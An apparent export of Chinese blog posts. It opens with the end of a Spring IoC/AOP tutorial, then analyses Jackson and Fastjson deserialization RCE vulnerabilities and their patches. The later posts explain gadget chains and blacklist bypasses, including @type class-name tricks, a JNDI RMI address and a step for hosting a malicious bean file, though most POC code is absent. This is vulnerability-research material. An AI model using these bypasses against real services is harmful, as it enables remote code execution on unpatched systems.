ApplicationContext。 BeanFactory是 IoC 容器的基本实现，也是 Spring 提供的最简单的 IoC 容器，它提供了 IoC 容器最基本的功能，由 org.springframework.beans.factory.BeanFactory 接口定义。BeanFactory 采用懒加载（lazy-load）机制，容器在加载配置文件时并不会立刻创建 Java 对象，只有程序中获取（使用）这个对对象时才会创建。它属于Spring内部使用接口，通常情况下不提供给开发人员使用。 ApplicationContext 是 BeanFactory 接口的子接口，是对 BeanFactory 的扩展。ApplicationContext 在 BeanFactory 的基础上增加了许多企业级的功能，例如 AOP（面向切面编程）、国际化、事务支持等。 它有两个常用的实现类： ClassPathXmlApplicationContext，加载类路径 ClassPath 下指定的 XML 配置文件，并完成 ApplicationContext 的实例化工作； FileSystemXmlApplicationContext，加载指定的文件系统路径中指定的 XML 配置文件，并完成 ApplicationContext 的实例化工作。 IoC示例创建一个maven，在pom.xml中添加依赖，报错就刷新maven下载依赖包： （lombok依赖包可以免除写get、set方法） 传统方法获取对象：创建实体类Student.java： 手动new对象： 通过IoC创建对象：Address.java： Student.java： 在配置文件中添加需要管理的对象，对各个对象以及它们之间的依赖关系进行配置；XML格式的配置文件，文件名可自定义，建在resource目录下（new-&gt;XML Configuration File-&gt;Spring Config）； 配置文件中的&lt;bean&gt;标签中： id指对象名； class指对象的模板类（所有交给IoCL来管理的类必须有无参构造方法，因为Spring底层是通过反射机制来创建对象，调用的是无参构造方法） 对象的成员变量通过property标签来赋值： name，成员变量名 value，成员变量值（基本数据类型，String可以直接赋值，其他引用类型不能通过value赋值） ref，将IoC中的另一个bean赋给当前的成员变量（DI注入） IoC创建对象： 创建 ApplicationContext 对象时使用了 ClassPathXmlApplicationContext 类，这个类用于加载 Spring 配置文件、创建和初始化所有对象（Bean）。ApplicationContext.getBean()方法用来获取 Bean，该方法返回值类型为 Object，通过强制类型转换为 student 的实例对象。 运行结果：[1] 由于对象的基本信息、对象之间的依赖关系都是在配置文件中定义的，并没有在代码中紧密耦合，因此即使对象发生改变，我们也只需要在配置文件中进行修改即可，而无须对 Java 代码进行修改，这就是 Spring IoC 实现解耦的原理。 IoC底层实现实际上就是xml解析和反射获取对象的过程。pom.xml添加依赖： 通过调用无参构造函数创建对象：配置文件（ref指向的bean最好放在前面，好赋值一点）： 模拟一个接口MyApplicationContext，里面有获取bean的抽象方法： 创建MyClassPathXmlApplicationContext类实现MyApplicationContext接口，模拟IoC进行xml解析和反射获取对象的操作。 MyTest.java： 运行结果：[2] &#x3D;&#x3D;？如何使用有参构造方法创建对象：; 通过有参构造函数创建对象配置文件，使用&lt;constructor-arg&gt;标签： student类中添加有参构造函数： 给Bean注入集合：配置文件： 成员变量类型定义为List：private List&lt;Address&gt; address; scope作用域Spring管理的Bean是根据scope来生成的，表示Bean的作用域，Spring 5提供了6种。 singleton：默认值，单例模式，表示在Spring容器中只有一个Bean实例。 prototype：原型模式，表示每次通过 Spring 容器获取 Bean 时，容器都会创建一个新的 Bean 实例。 request ：每次 HTTP 请求，容器都会创建一个 Bean 实例。该作用域只在当前 HTTP Request 内有效。 session ：同一个 HTTP Session 共享一个 Bean 实例，不同的 Session 使用不同的 Bean 实例。该作用域仅在当前 HTTP Session 内有效。 application ：同一个 Web 应用共享一个 Bean 实例，该作用域在当前 ServletContext 内有效。 websocket ：websocket 的作用域是 WebSocket ，即在整个 WebSocket 中有效。request和session只适用于web项目，使用单例模式和原型模式的较多。 单例模式示例：在配置文件中，为bean添加scope=&quot;singleton&quot;； 在main方法中获取三个Bean，并进行比较： 返回结果为true；[3] 说明无论获取多少个Bean，实际上都是同一个，指向一个地址；单例模式下，当Spring加载配置文件时就会创建Bean，后无面论是否获取Bean（getBean），都不再创建新的bean； 缺点：当我们不需要获取Bean时就已经创建了Bean； 优点：只用创建一个Bean，节省空间。 原型模式示例：在配置文件中改为scope=&quot;prototype&quot;；同样获取三个Bean，结果为false；[4] 说明三个Bean实例都不一样，指向三个地址 。 原型模式下，当业务代码获取IoC容器中的bean时(调用getBean时)，Spring才去调用无参构造函数创建对应的bean； 缺点：每获取一个Bean就要创建一个对象，占用空间； 优点，只在需要使用Bean的时候才创建Bean。 Spring Bean继承Spring中Bean继承是对象层面的继承，子Bean可以继承父Bean的属性值和父Bean的配置数据，可以根据需要重写或添加配置信息；(Java继承是类层面的继承，子类可以继承父类的内部结构信息) 子Bean的类的属性要多于等于父Bean的类的属性，否则会报错。 示例：在配置文件中定义student2继承student1，并修改name属性值，添加了sex属性，其他属性不变； main方法中获取分别两个bean； 结果可以看到，除了修改的name属性，添加的sex属性，其他属性都继承了student1；[5] Spring 依赖依赖也是bean和bean之间的一种关系，配置依赖后，被依赖的bean一定是先创建，再创建依赖的bean。（A依赖于B，先创建B，再创建A） 默认情况下，在配置文件中写在前面的Bean先创建，后面的Bean后创建。添加depends-on=&quot;&quot;缺点依赖关系； 配置文件，student依赖于teacher： Teacher.java: Student.java： 结果是Teacher对象先创建，说明不论位置关系如何，被依赖的对象都是先创建。[6] Spring Bean属性注入属性注入就是将属性注入到Bean中的过程，这些属性既可以是普通型，也可以是对象（Bean）。 Spring 主要通过以下 2 种方式实现属性注入： 构造函数注入 setter 注入（又称设值注入） 前面也都已经演示过了；构造函数注入就是在配置文件中使用&lt;constructor-arg&gt;对属性进行赋值；seter注入就是使用&lt;property&gt;对属性进行赋值。 在通过构造函数或 setter 方法进行属性注入时，通常是在 &lt;bean&gt; 元素中嵌套 &lt;property&gt; 和&lt;constructor-arg&gt;元素来实现的。这种方式虽然结构清晰，但书写较繁琐。Spring提供了两种短命名空间，以简化xml配置： p命名空间： &lt;bean id=&quot;Bean 唯一标志符&quot; class=&quot;包名+类名&quot; p:普通属性=&quot;普通属性值&quot; p:对象属性-ref=&quot;对象的引用&quot;&gt; c命名空间： &lt;bean id=&quot;Bean 唯一标志符&quot; class=&quot;包名+类名&quot; c:普通属性=&quot;普通属性值&quot; c:对象属性-ref=&quot;对象的引用&quot;&gt; p命名空间使用p命名空间需要在配置文件的&lt;beans&gt;元素中导入如下XML约束：xmlns:p=&quot;; 在配置文件中给属性的赋值写成如下样子(xmlns:p..要写在xsl:sche..前面)： 使用 p 命名空间注入依赖时，必须注意以下 3 点： Java 类中必须有 setter 方法； Java 类中必须有无参构造器（类中不包含任何带参构造函数的情况，无参构造函数默认存在）； 在使用 p 命名空间实现属性注入前，XML 配置的 &lt;beans&gt; 元素内必须先导入 p 命名空间的 XML 约束。 c命名空间使用c命名空间需要在配置文件的&lt;beans&gt;元素中导入如下XML约束：xmlns:c=&quot;; 在配置文件中给属性的赋值写成如下样子： 使用 c 命名空间注入依赖时，必须注意以下 2 点： Java 类中必须包含对应的有参构造函数； 在使用 c 命名空间实现属性注入前，XML 配置的 &lt;beans&gt; 元素内必须先导入 c 命名空间的 XML 约束。 Spring的工厂方法IoC通过工程模式创建bean的方式有两种： 静态工厂方法 实例工厂方法 静态工厂方法示例spring-config.xml，在&lt;bean&gt;中添加factory-method=&quot;getCar&quot;： Car.java： 静态工厂方法，里面定义一个静态代码块： main方法获取car： 运行结果：[7] 当MyCar中加载配置文件进内存时，就执行了StaticCarFactory中的静态代码块，创建了Bean，当getBean时再拿出来使用。 实例工厂方法配置文件中配置两个&lt;bean&gt;，先创建实例工厂的对象，再通过实例工厂对象来创建Car对象；（实例工厂本身需要实例化，静态工厂不用） 给Map赋值就写在构造方法中： main方法中获取Car的Bean； Spring自动装配（Autowire）在Bean与Bean之间建立依赖关系的行为称为“装配”；IoC容器本身是并不能独自完成装配工作，需要我们主动将Bean放进去，并告诉它Bean之间的依赖关系，它才能按照我们的要求完成装配工作。手动通过配置&lt;property&gt;和&lt;constructor-arg&gt;来维护Bean之间的依赖关系会随着依赖关系的增加使代码越来越复杂和繁琐，而自动装配大大提高了开发效率。 Spring 的自动装配功能可以让 Spring 容器依据某种规则（自动装配的规则，有五种），为指定的 Bean 从应用的上下文（AppplicationContext 容器）中查找它所依赖的 Bean，并自动建立 Bean 之间的依赖关系。 Spring 框架式默认不支持自动装配的，要想使用自动装配，则需要对 Spring XML 配置文件中&lt;bean&gt;元素的 autowire 属性进行设置；&lt;bean id=&quot;&quot; class=&quot;&quot; autowire=&quot;自动装配规则&quot;&gt; 自动装配规则 byName 按名称自动装配。Spring 会根据的 Java 类中对象属性的名称，在整个应用的上下文 ApplicationContext（IoC 容器）中查找。若某个 Bean 的 id 或 name 属性值与这个对象属性的名称相同，则获取这个 Bean，并与当前的 Java 类 Bean 建立关联关系。 byType 按类型自动装配。Spring 会根据 Java 类中的对象属性的类型，在整个应用的上下文 ApplicationContext（IoC 容器）中查找。若某个 Bean 的 class 属性值与这个对象属性的类型相匹配，则获取这个 Bean，并与当前的 Java 类的 Bean 建立关联关系。 constructor 按类型自动装配。与 byType 模式相似，不同之处在与它应用于构造器参数（依赖项），如果在容器中没有找到与构造器参数类型一致的 Bean，那么将抛出异常。其实就是根据构造器参数的数据类型，进行 byType 模式的自动装配。 default 表示默认采用上一级元素 &lt;beans&gt;设置的自动装配规则（default-autowire）进行装配。 no 默认值，表示不使用自动装配Bean 的依赖关系必须通过 &lt;constructor-arg&gt;和 &lt;property&gt;元素的 ref 属性来定义。 示例：在配置文件中使用autowire将car注入到person中，替代ref； Person类中定义一个Car类型参数： main方法： 如果autowire=&quot;byName&quot;，则根据Person类中的Car类型的参数名car，在&lt;bean&gt;中寻找id为car的bean，如果找不到，则car参数值为null；如果autowire=&quot;byType&quot;，则根据Person类中的Car类型，在&lt;bean&gt;中寻找类型为Car的bean，不论名称是否相等，如果找不到则报错；如果存在多个Car类型的bean，会抛出异常——没有唯一的bean。 AOPAOP使对面向对象的一个补充，在运行时，动态的将代码切入到类的指定方法、指定位置上的编程思想就是面向切面编程。将不同方法的同一个位置抽象成一个切面，对该切面对象进行编程就是AOP。 AOP的优点: 降低模块之间的耦合度 使系统容易扩展 更好的代码复用 非业务代码更加集中，不分散，便于统一管理 业务代码更简洁纯粹，没有其他代码影响 动态代理 AOP示例Spring AOP的底层是通过动态代理为目标对象执行横向织入的；Spring 在运行期会为目标对象生成一个动态代理对象，并在代理对象中实现对目标对象的增强。 创建Maven工程，导入依赖包； 定义一个计算器接口： 写它的实现类，这个是需要被代理的类，里面的方法属于是业务方法： 定义一个处理器，需要用它来生成代理对象： main方法： 运行结果：[8] 把每个方法中重复的输出代码，整合到invoke方法中，简化代码，这就是AOP； 实现原理就是动态代理的知识，当调用被代理类的方法的时候，会自动调用handler中的invoke方法，所以每调用一次计算方法，就调用一次invoke方法，进行一次输出。 Spring AOP示例Spring框架对AOP进行了封装，使用Spring框架可以用面向爱对象的思想来实现AOP；Spring框架中不需要创建Invocationhandler，只需要创建一个切面对象，将所有的非业务代码在切面对象中完成，Spring框架底层会自动根据切面类以及目标类生成一个代理对象。 定义切面类，在里面添加如下注解：@Aspect注解表示该类是切面类；@Component注解表示将该类的对象注入到IoC容器中；@Before注解表示方法执行的时机，在关联类中的方法执行前执行该方法，将before()方法与CalcImpl类中的方法位置关联起来；@After注解表示在关联类中的方法执行后、返回前执行该方法；@AfterReturning注解表示在关联类的方法返回后执行该方法，第二个参数表示返回的参数，这里的名字不一定要和关联类中方法的返回参数的名字相同，但是必须和该方法的形参名一致；@AfterThrowing注解表示在关联类的方法出现异常是执行该方法。 JoinPoint是连接点，可以实现方法调用，实际上也是通过反射调用。 CalcImpl中也添加@Component注解，将它交给IoC容器来管理；该注解就相当于在配置文件中写了一个&lt;bean&gt;，id默认是类名calcImpl(首字母小写)，也可自定义名称@Component(&quot;calc&quot;)：&lt;bean id=&quot;calcImpl&quot; class=&quot;AOP.CalcImpl&quot;&gt;&lt;/bean&gt; 将切面类交给IoC管理，一是需要添加@Component注解，二是需要Spring框架来扫描该类；在配置文件中添加一个自动扫描context:component-scan，它会到base-package中的类去扫描，如果扫描到添加了@Component注解，就把这个类交给IoC容器，让IoC来管理它的对象；aop:aspectj-autoproxy让Spring框架结合切面类和目标类自动生成动态代理对象。（相当于当Spring自动实现handler的功能） 配置文件如下： main方法，加载配置文件，生成代理对象： 运行结果：[9] 切面:横切关注点被模块化的抽象对象。 通知:切面对象完成的工，即非业务代码。 目标:被通知的对象，即被横切的对象。 代理:切面、通知、目标混合之后的对象。 连接点:通知要插入业务代码的具体位置。 切点: AOP通过切点定位到连接点。 "},{"title":"Jackson 反序列化 RCE","date":"2022-09-19T11:31:58.000Z","url":"/2022/09/19/Jackson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20RCE/","categories":[[" ",""]],"content":"CVE-2017-7525影响版本 Jackson 2.6系列 &lt; 2.6.7.1 Jackson 2.7系列 &lt; 2.7.9.1 Jackson 2.8系列 &lt; 2.8.8.1 环境搭建我用的是 JDK 8u20，对 JDK 的版本要求比较不确定，网上大部分人用 7u21 能复现，但是我的不行，得自己多试试。 导入依赖： 漏洞复现（TemplatesImpl 链）这里直接贴 POC，和 Fastjson 的 TemplatesImpl 链差不多，直接看能看懂。 构造一个恶意类，继承 AbstractTranslet（在 Fastjson 里说过原因）； 将恶意类的字节码进行 base64 编码； 定义一个实体类，其中包含一个Object属性； 使用com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类构造 POC；在 User 类的object属性中指明该属性类的全类名，并且给其相应的变量赋值，transletBytecodes是恶意类的字节码进行 base64 编码后的值；设置 DefaultTyping 为默认值，即 OBJECT_AND_NON_CONCRETE； 运行成功： 不开启 DefaultTyping 的话只会将 JSON 数据当作普通字符串来解析，并不会触发object属性值里的恶意代码； POC 调试跟进ObjectMapper.readValue() ； 分别跟进，JsonFactory.createParser()，封装了要反序列化的 JSON 数据，返回一个ReaderBasedJsonParser类对象； 跟进TypeFactory.constructType()，获取到的是entity.User类； 然后跟进 ObjectMapper._readMapAndClose()，各变量的值如图所示； 跟进BeanDeserializer.deserialize()，进入 if 语句； 跟进vanillaDeserialize()，调用StdValueInstantiator.createUsingDefault()方法根据构造方法实例化了一个 User 对象，各属性值都为 null ； 跟进MethodProperty.deserializeAndSet()，调用了SettableBeanProperty.deserialize() -&gt; StringDeserializer.deserialize()方法，将name的值取了出来，然后调用 setter方法将值赋给前面生成的 User 对象； 循环调用deserializeAndSet()方法，把每一个属性的值都取出来赋给 User 对象；直到获取object的值，this._valueTypeDeserializer的值不为 null ，调用UntypedObjectDeserializer.deserializeWithType(); 继续调用AsArrayTypeDeserializer.deserializeTypedFromAny() -&gt; _deserialize()，获取到对应TemplatesImpl类的 deser 是BeanDeserializer类型； 调用BeanDeserializer.deserialize() -&gt; vanillaDeserialize() -&gt; MethodProperty.deserializeAndSet()，和前面一样，将 JSON 数据中 TemplatesImpl 的值去除赋给TemplatesImpl 对象； 当取到outputProperties变量时，跟进到SetterlessProperty.deserializeAndSet()，调用的是getter方法； 这里为什么调用deserializeAndSet()的类不一样，是因为outputProperties变量对应的类不一样； 继续，一直跟进到TemplatesImpl.defineTransletClasses()，和 Fastjson 一样，在这里将传入的字节码转换为了 Java 对象； 然后在getTransletInstance()实例化该对象，触发命令执行。 调用链如下： 可以看到在defineTransletClasses()的 332 行中，和之前分析的 Fastjson 有点不一样；之前是这样的，区别在于有无_tfactory参数： 这是因为 JDK 版本不同，如果使用 8u112 版本，把_tfactory参数添加到 POC 里_tfactory:&#123; &#125;，会报错； 这个错误是 jackson-databind 报的，说明它不支持这个参数，所以只能选择没有_tfactory参数的 JDK 版本进行利用。 参考链接： CVE-2017-17485补丁分析jackson-databind 2.7.9.1 版本中，在获取typeId对应的 Deserializer 类型时，对传入的类做了黑名单校验； 一直到BeanDeserializerFactory.createBeanDeserializer()中，调用了 checkIllegalTypes()方法（注意看调用链）； 跟进checkIllegalTypes()，获取了传入类的全类名，然后在黑名单中对比； 可以看到com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl以及被加入到了黑名单中，所以无法在利用了。 补丁绕过在开启enableDefaultTyping()的情况下，利用org.springframework.context.support.ClassPathXmlApplicationContext来加载远程指定的 XML 配置文件，在配置文件中定义一个 bean ，bean 中通过使用 Spring EL 表达式来调用java.lang.ProcessBuilder的start()方法来执行命令。 导入依赖： 构造 bean 文件 spel.xml： 启一个 web 服务，把 bean 文件放到能访问的 web 目录下：python -m http.server 8081 构造 POC ，把object 属性赋值为org.springframework.context.support.ClassPathXmlApplicationContext： 运行成功： 影响版本 Jackson-databind version 2.9.3 Jackson-databind version 2.7.9.1 Jackson-databind version 2.8.10 POC 调试跟进获取object属性值时的BeanDeserializer.vanillaDeserialize()； 能成功绕过黑名单，一直到AnnotatedConstructor.call1()，调用ClassPathXmlApplicationContext的构造函数，以为参数实例化了一个对象； 这一步就是 Spring 加载配置文件、创建和初始化 bean 的步骤了。 继续跟跟看，跟进构造方法； 调用setConfigLocations()，对远程地址进行解析； 而后 new 了一个 StandardEnvironment； 它是 AbstractEnvironment 的子类，作用是获取和设置应用程序的属性和环境； 最后 refresh 一下，触发命令执行。 调用链如下： 参考链接： c3p0利用使用com.mchange.v2.c3p0.JndiRefForwardingDataSource，通过 JNDI+ RMI 进行利用。服务端代码： 客户端代码： 运行成功： 这里调用jndiName的 set 方法，把rmi://127.0.0.1:1099/calc赋给它； 然后调用到loginTimeout的 set 方法； 跟进setLoginTimeout() -&gt; inner()； 跟进JndiRefForwardingDataSource.dereference()，调用到lookup()，触发命令执行。 调用链如下： CVE-2018-5968补丁分析 2.7.9.2 版本中，使用了validateSubType()方法对传入的类进行黑名单校验； 虽然org.springframework.context.support.ClassPathXmlApplicationContext不在黑名单中，但是专门对org.springframework.开头的类进行了判断； 然后循环获取它的父类，再在 if 中进行对比，若父类为AbstractPointcutAdvisor或AbstractApplicationContext，则跳出循环，抛出异常。 同时也把 c3p0 可利用的类加入了黑名单； 补丁绕过寻找黑名单中没有的、可利用的类，可以使用org.apache.ibatis.datasource.jndi.JndiDataSourceFactory，通过 JNDI + LDAP 的方式进行利用。 漏洞触发点在JndiDataSourceFactory.setProperties()中，if 分支和 else if 分支都使用了 lookup，满足其中一个分支就可以了； 这里我根据 else if 分支来构造 POC，也就是说如果properties参数里面包含data_source，就进入else if；那么就向properties参数中传入一个 键为data_source，值为远程恶意类地址 的值，当反序列化时调用到setProperties()，进入 else if 分支，检索指定的远程对象，导致RCE。 导入依赖： 启一个 Web 服务，上传命令执行类的 class 文件； 服务端代码编写（参考marshalsec）： 客户端代码编写，需要开启 DefaultTyping； 运行成功： 影响版本2.8.11和2.9.x至2.9.3 POC 调试能成功绕过黑名单检测； 递归获取到properties参数； 跟进到MapDeserializer.deserialize()，获取到properties参数类型是 Properties ； 调用_readAndBindStringMap()进行参数绑定，获取到参数名data_source；调用StringDeserializer.deserialize()获取参数值，最后将参数值赋给data_source； 回到deserializeAndSet()，调用properties的 set 方法； 最后调用lookup()触发命令执行。 调用链如下： 参考链接："},{"title":"Jackson 简单学习","date":"2022-09-19T11:31:57.000Z","url":"/2022/09/19/Jackson%20%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/","categories":[[" ",""]],"content":"前言Jackson是一个开源的Java序列化和反序列化工具，可以将Java对象序列化为XML或JSON格式的字符串，以及将XML或JSON格式的字符串反序列化为Java对象。 需要在工程中导入依赖： 最常用的 API 是基于“对象绑定”的 ObjectMapper，其中包含多个序列化和反序列化的方法。 序列化可以通过ObjectMapper类中writeValuexxx方法将 Java 对象序列化为 JSON 数据，以不同的格式存储； writeValueAsString(Object value) 方法，将对象存储成字符串 writeValueAsBytes(Object value) 方法，将对象存储成字节数组 writeValue(File resultFile, Object value) 方法，将对象存储成文件 定义一个实体类，city变量没有 get 方法： 将 Java 对象序列化为 JSON字符串： 运行结果： 可以看到，调用了setCity()，但是在序列化的结果中并没有city属性，因为它没有设置 get 方法。 反序列化可以通过ObjectMapper类中readValue()方法，将不同类型的 JSON 数据反序列化为 Java 对象； readValue(String content, Class&lt;T&gt; valueType) 方法，将字符串反序列化为 Java 对象 readValue(byte[] src, Class&lt;T&gt; valueType) 方法，将字节数组反序列化为 Java 对象 readValue(File src, Class&lt;T&gt; valueType) 方法，将文件反序列化为 Java 对象 反序列化示例： 运行结果，city输出能够被反序列化： Jackson 多态类型的反序列化在反序列化时，只知道反序列化的类的类型，但是不知道这个类中各个属性是什么类型，可能是 Object类型，也可能是 interface 类型，那么如何知道反序列化的类的属性是什么类型呢？ 这就是由 JacksonPolymorphicDeserialization 机制来解决这个问题。 将属性具体类型信息序列化到 JSON 数据中的方法有两种： 设置 DefaultTyping 使用 @JsonTypeInfo 注解 DefaultTypingJackson 中提供了一个 DefaultTyping 属性，其中包含四个值： 通过enableDefaultTyping()方法来设置属性值。 JAVA_LANG_OBJECT当类里的属性声明为一个 Object 时，会对该属性进行序列化和反序列化，并且明确规定类名。 在实体类中设置一个Object类型的成员变量； 设置 DefaultTyping 为 JAVA_LANG_OBJECT，给object变量赋值为People对象； People 类，需要有无参构造； 运行结果： 可以看到，设置了 DefaultTyping 的序列化结果会输出该属性的类型，反序列化的结果中也还原了属性类型。 OBJECT_AND_NON_CONCRETE这是enableDefaultTyping()的默认值。当类里有 Interface 、 AbstractClass 类型属性时，会对其进行序列化和反序列化。 定义一个接口及其实现类： 在 User 类中添加上该属性： 设置 DefaultTyping 为 OBJECT_AND_NON_CONCRETE，运行结果可以看到将接口类型的属性也进行了序列化： NON_CONCRETE_AND_ARRAYS支持数组类型的属性序列化和反序列化。 给object赋值为 People 数组类型： 运行结果： NON_FINAL支持除 final 属性外的所有类型序列化和反序列化。 运行结果： 将数组中每个对象的类型都列了出来。 @JsonTypeInfo 注解@JsonTypeInfo 注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值： @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.NONE) @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.CLASS) @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.MINIMAL_CLASS) @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.NAME) @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.COSTOM) JsonTypeInfo.Id.NONE在实体类的object属性上添加该注解： 运行结果如下，与不添加该注解没区别： JsonTypeInfo.Id.CLASS在实体类的object属性上添加该注解： 运行结果如下： 在序列化的结果中，object属性中多了一个@class字段，指明了该属性类型的全类名；反序列化时能够成功将object的值按照entity.People类转换为 People 对象。 JsonTypeInfo.Id.MINIMAL_CLASS在实体类的object属性上添加该注解：@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS) 运行结果如下： 效果和 JsonTypeInfo.Id.CLASS 一样，只是用@c代替了@class。 JsonTypeInfo.Id.NAME在实体类的object属性上添加该注解：@JsonTypeInfo(use = JsonTypeInfo.Id.NAME) 运行结果如下： 序列化结果中多了一个@type字段，指明了类名；但是反序列化时出现了报错，因为@type字段只指明了类名，没指明包名，反序列化无法找到具体是那个包下 People 类，所以反序列化失败。 JsonTypeInfo.Id.CUSTOM在实体类的object属性上添加该注解：@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM) 这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常： 总结当 JSON 字符串中指明了反序列化属性的全类名时，就可以将 JSON 数据反序列化为对应对象。 在下列设置的情况下进行序列化生成的 JSON 数据，指明了属性的全类名： enableDefaultTyping() @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.CLASS) @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.MINIMAL_CLASS) 和 Fastjson 一样，在序列化、反序列化时会调用对应方法的 get、set 方法，包括Object属性对应类的 get、set 方法： 也就是说，如果反序列化的类及其属性类的 get、set 方法中存在可控参数，就可以通过构造恶意的 JSON 数据来利用。 参考链接："},{"title":"Fastjson 反序列化RCE","date":"2022-09-19T11:31:56.000Z","url":"/2022/09/19/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20RCE/","categories":[[" ",""]],"content":"Fastjson &lt;&#x3D; 1.2.41补丁分析从 1.2.25 版本开始，在黑名单中添加了许多禁止反序列化的包名，并且新增了checkAutoType()方法来对反序列化的类型进行判断。 代码对比： 1.2.24版本：在DefaultJSONParser.parserObject()中，276行加载了@type指定的类，318行调用getDeserializer()； 在ParserConfig.getDeserializer()中对加载的类进行了黑名单校验，黑名单中只有java.lang.Thread，程序能够继续执行。 1.2.25 版本：在DefaultJSONParser.parserObject()中，276行调用了checkAutoType()对获取到的@type字符串进行校验； 727行会先从mapping中去找有没有传入的类，这里是没有的，clazz为 null；autoTypeSupport默认为false，进入循环检测，这里的denyList里面添加了许多包名，包括我们前面使用的 TemplatesImpl 和 JdbcRowSetImpl，都属于com.sun，所以在这里就会报异常。 补丁绕过主要就是要绕过checkAutoType()检测。 首先，想要绕过黑名单检测，就得构造类名不在黑名单内，比如随便在类名上添加点字母符号之类的；然后，还得能加载这个类，有loadClass()的地方有这三个； 有两个是在对acceptList[]的循环中，acceptList[]这个数组本来就没有元素，所以根本不会进入 for 循环；那么就只剩第三个，需要满足的条件要么autoTypeSupport为 true，要么expectClass不为 null；可是expectClass本来传入的就是 null，改不了；所以只能通过修改autoTypeSupport属性为 true 来进入 if 语句； 跟进TypeUtils.loadClass()看看，clazz肯定是为 null 的，两个else if 中都调用了loadClass()； 第一个else if 中，判断了是否以[开头，尝试在类名前添加[，出现报错，说在 71 的位置希望有个[； 那就在 71 的位置添加上[再看，又说在 72 的位置希望有个&#123;； 那就继续添加&#123;，最后能成功执行命令。 在第二个 else if 中，判断了类名是否以L开头和;结尾，如果是，就把这两个字符去掉，形成新的类名，再加载。 所以，绕过补丁只需要两个条件： autoTypeSupport为 true 在类名对应位置添加指定字符 或 类名以L开头，以;结尾 POC 调试这里我就用 TemplatesImpl 链做演示，原理都一样；第一种绕过方式构造 POC 如下: 断点调试，只贴关键部分； 调用checkAutoType()； 能成功绕过黑名单检测； 进入loadClass()，实例化了一个Array类型，返回一个如图的 clazz； 返回ObjectArrayCodec类型的对象； 150 行去除了类名前后的字符，下面进入parseArray()； 一直跟到ParserConfig.getDeserializer()，因为clazz已经是正常类，所以进入 410 行，后续就和之前的分析一样。 第二种绕过方式构造@type如下：&quot;\\&quot;@type\\&quot;:\\&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\\&quot;,&quot; 调用checkAutoType()； 跟进checkAutoType()，能成功绕过黑名单检测； 跟进loadClass()，生成新的、存在的类名，再调用一次loadClass()； 然后正常加载并返回TemplatesImpl类； 成功获取到TemplatesImpl类后，正常进行后续的实例化恶意类操作。 1.2.43 之前的版本都是针对第二种绕过方式的修复，第一种绕过方式仍然可以使用。 Fastjson &lt;&#x3D; 1.2.42补丁分析在 1.2.42 的checkAutoType()中，把黑名单校验改成了 hash 值进行校验； 计算逻辑不算太难理解： 这里有更多类、包对应的 hash： 先用上一个 POC 调试看看； 发现 796 行把全类名前后的L和;去掉了；然后再取新类名的前三个字符进行计算，然后在 805 行的 for 循环中每次取后面一个字符进行 计算；白名单acceptHashCodes依旧为空，在 815 行判断这时的 hash 值是否在黑名单中，&gt;=0表示存在，第二个逻辑判断恒为真；循环到i=7，也就是已经将com.sun.进行了 hash 计算，这个时候得到 hash 值为 4147696707147271408，在黑名单中存在，所以在这里会报异常。 补丁绕过要绕过黑名单，也就是要让在去除L和;后的类名也不在黑名单中；发现去除L和;的操作只会进行一次，并没有循环去除，尝试双写进行绕过。 POC 调试修改@type值为LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;，其余不变； 能成功走出黑名单检测，来到TypeUtils.loadClass()； 这里会调用两次loadClass()来去除类名前后的字符； 最后再加载。 Fastjson &lt;&#x3D; 1.2.43补丁分析在 1.2.43 的checkAutoType()中，对多写的LL和;;进行了判断，如果出现，会报异常； 补丁绕过那么通过添加LL和;;就行不通了，不过还可以用上面Fastjson &lt;= 1.2.41中提到的第一种绕过方式进行绕过。 Fastjson &lt;&#x3D; 1.2.45补丁分析从 1.2.44 开始，在checkAutoType()中判断了全类名第一个字符是否是[，和首尾字符是否是L和;； 这下将两种绕过方式都限制了，只有另外找一条利用链。 补丁绕过寻找到一个黑名单中没有的类：org.apache.ibatis.datasource.jndi.JndiDataSourceFactory通过 JNDI + LDAP 的方式进行利用。 前提需要目标服务器存在 3.x.x-3.5.0的 mybatis jar包。 构造 POC先看一下JndiDataSourceFactory类的方法和成员变量； 漏洞触发点在JndiDataSourceFactory.setProperties()中，if 分支和 else if 分支都使用了 lookup，满足其中一个分支就可以了； 这里我根据 else if 分支来构造 POC，也就是说如果properties参数里面包含data_source，就进入else if；那么就向properties参数中传入一个 键为data_source，值为远程恶意类地址 的值，当反序列化时调用到setProperties()，进入 else if 分支，检索指定的远程对象，导致RCE。autoTypeSupport仍然要设为 true。 同样启一个 Web 服务，上传命令执行类的 class 文件； 导入依赖： 服务端代码编写（参考marshalsec）： 客户端代码编写： POC 调试调用过程都差不多，在DefaultJSONParser.parseObject() 298 行进入checkAutoType()，能成功绕过校验； 最后调用到setProperties()，调用链如图： Fastjson &lt;&#x3D; 1.2.47从 1.2.46 版本中将org.apache.ibatis.datasource加入了黑名单； 补丁绕过在1.2.47 及以前的版本中，还存在一种通用利用方式；在checkAutoType()中，要想加载到指定类，要么绕过检测，要么能从mapping中返回clazz；TypeUtils.loadClass()中的cache默认传入为 true，并且有将className添加进mapping的操作； 当传入的类是java.lang.Class时，会调用TypeUtils.loadClass()，strVal是可控的参数； 所以将val参数赋值为com.sun.rowset.JdbcRowSetImpl，就可以成功将它添加进mapping中。 构造 POC要构造两部分，一部分就是通过java.lang.Class将com.sun.rowset.JdbcRowSetImpl添加进mapping；另一部分就是构造反序列化为com.sun.rowset.JdbcRowSetImpl类型导致RCE所需要的参数； 